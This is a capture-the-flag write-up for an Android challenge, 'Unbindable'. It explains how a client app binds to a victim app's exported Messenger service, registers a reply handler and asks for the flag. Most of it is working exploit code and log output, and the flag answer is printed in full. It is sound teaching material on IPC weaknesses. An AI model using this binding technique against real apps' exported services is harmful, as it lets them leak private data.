# Unbindable 
Bind to the service and get the flag. It can't get any easier.


```xml
=================================================================
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="[http://schemas.android.com/apk/res/android](http://schemas.android.com/apk/res/android)"
    package="com.example.victimapp">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.VictimApp">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".UnbindableService" android:enabled="true" android:exported="true"/>
    </application>

</manifest>
```
```java
=================================================================
package com.example.victimapp;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import java.util.ArrayList;

public class UnbindableService extends Service {

    ArrayList<Messenger> mClients = new ArrayList<Messenger>();

    int mValue = 0;

    static final int MSG_REGISTER_CLIENT = 1;

    static final int MSG_UNREGISTER_CLIENT = 2;

    static final int MSG_SET_VALUE = 3;

    static final int MSG_GET_FLAG = 4;

    static final String TAG = "MOBIOTSEC";

    class IncomingHandler extends Handler {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case MSG_REGISTER_CLIENT:
                    mClients.add(msg.replyTo);
                    Log.i(TAG, "Malicious app bound to the service");
                    break;
                case MSG_UNREGISTER_CLIENT:
                    mClients.remove(msg.replyTo);
                    break;
                case MSG_SET_VALUE:
                    mValue = msg.arg1;
                    for (int i=mClients.size()-1; i>=0; i--) {
                        try {
                            mClients.get(i).send(Message.obtain(null,
                                    MSG_SET_VALUE, mValue, 0));
                        } catch (RemoteException e) {
                            // The client is dead.  Remove it from the list;
                            // we are going through the list from back to front
                            // so this is safe to do inside the loop.
                            mClients.remove(i);
                        }
                    }
                    break;
                case MSG_GET_FLAG:
                    for (int i=mClients.size()-1; i>=0; i--)
                        try {
                            Bundle b = new Bundle();
                            b.putString("flag", MainActivity.flag);
                            mClients.get(i).send(Message.obtain(null,
                                    MSG_GET_FLAG, b));
                        } catch (RemoteException e) {
                            // The client is dead.  Remove it from the list;
                            // we are going through the list from back to front
                            // so this is safe to do inside the loop.
                            mClients.remove(i);
                        }
                    break;


                default:
                    super.handleMessage(msg);
            }
        }
    }

    final Messenger mMessenger = new Messenger(new IncomingHandler());

    @Override
    public void onCreate() {

    }
    @Override
    public void onDestroy() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        return mMessenger.getBinder();
    }
}
```
___

## How to solve it 

**Core Concept:** Create a **Bound Service** using the **Messenger IPC** (Inter-Process Communication).



Reference: [Android Bound Services](https://developer.android.com/develop/background-work/services/bound-services)

The Manifest defines a service:
* `com.example.victimapp.UnbindableService`
* `enabled="true"`, `exported="true"` (We can talk to it).

**The Protocol (Reading the Java Code):**
The code tells us how we must "speak" to the service. It uses a `Messenger`, meaning we send `Message` objects with integer codes (defined in `msg.what`).

1.  **Handshake (`MSG_REGISTER_CLIENT = 1`):**
    * Code: `mClients.add(msg.replyTo);`
    * **Analysis:** When we send this message, the service takes the `replyTo` field (our messenger) and saves it in a list. This is how it knows where to send the flag later.
2.  **Request Flag (`MSG_GET_FLAG = 4`):**
    * Code: The service loops through `mClients` and sends a reply message containing a Bundle with the key `"flag"`.

**Started vs Bound Services:**
* **Started Service (`startService`):** Like sending an email. Fire and forget.
* **Bound Service (`bindService`):** Like a phone call. You establish a persistent connection. This challenge requires this because we need a two-way conversation.

### 1. Android Manifest 
To interact with the victim app, we must declare visibility.

```xml
<queries>
    <package android:name="com.example.victimapp" />
</queries>
```

### 2. Incoming Handler 
We need a handler in our malicious app to process the *incoming* message (the reply) from the service.

```java
static class IncomingHandler extends Handler {
    private static final String TAG = "CTF";

    @Override
    public void handleMessage(Message msg) {

        // Challenge Spec: MSG_GET_FLAG returns ID 4
        if (msg.what == 4) {
            
            // Extract the bundle from the message object
            Bundle bundle = (Bundle) msg.obj;

            if (bundle != null) {
                for (String key : bundle.keySet()) {
                    Object value = bundle.get(key);
                    Log.d(TAG, "Found Key: " + key + " | Value: " + value);
                }
            }
        }
    }
}
```

### 3. Service Connection Logic
This is where the magic happens. We define the `Messenger` that listens (Client) and the one that sends (Service).

```java
// 1. Create the Messenger that will RECEIVE the flag
final Messenger mClientMessenger = new Messenger(new IncomingHandler());

// 2. Variable to hold the reference to the VICTIM service
Messenger mService = null;
boolean bound = false;

// 3. The Connection Interface
private ServiceConnection mConnection = new ServiceConnection() {
    public void onServiceConnected(ComponentName className, IBinder service) {
        mService = new Messenger(service);
        bound = true;

        try {
            // --- Step A: Register (ID 1) ---
            Message msgRegister = Message.obtain(null, 1);
            
            // CRITICAL: Tell the service "Reply to ME (mClientMessenger)"
            msgRegister.replyTo = mClientMessenger; 
            mService.send(msgRegister);

            // --- Step B: Get Flag (ID 4) ---
            Message msgFlag = Message.obtain(null, 4);
            mService.send(msgFlag);

        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    public void onServiceDisconnected(ComponentName className) {
        mService = null;
        bound = false;
    }
};
```

### 4. Bind the Service (onCreate)
We use an **Explicit Intent** to target the specific class within the victim package.

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // 4. Define who we are binding to
    Intent intent = new Intent();
    intent.setClassName("com.example.victimapp", "com.example.victimapp.UnbindableService");

    // 5. Establish the connection
    bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
}
```

### 5. Cleanup (Good Practice)
Always unbind to prevent leaks.

```java
@Override
protected void onDestroy() {
    super.onDestroy();
    if (bound) {
        unbindService(mConnection);
        bound = false;
    }
}
```

## Solution 

Logs showing the flag captured by our `IncomingHandler`:

```bash
2026-01-20 18:05:51.439 12448-12448 CTF    com.example.maliciousapp   D  Found Key: flag | Value: FLAG{si_vis_pacem_para_bellum}
```

**Flag:** `FLAG{si_vis_pacem_para_bellum}`